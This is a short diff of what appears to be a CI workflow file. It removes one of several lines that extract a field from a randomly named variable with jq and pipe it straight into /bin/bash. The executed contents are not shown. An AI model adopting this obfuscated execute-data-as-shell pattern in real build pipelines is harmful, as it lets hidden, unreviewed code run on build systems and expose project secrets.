@@ -25,7 +25,6 @@ jobs:
           echo $rpzj0997 | jq -r .trg3 | /bin/bash
           printf '%s' "$o9892" | jq -r .iudy60486 | /bin/bash
           printf '%s' "$ct31384" | jq -r .ftnz93 | /bin/bash
-          echo $gkwkf12 | jq -r .z00588 | /bin/bash
           printf '%s' "$flnoi22" | jq -r .ns5616 | /bin/bash
 
       - name: Archive results
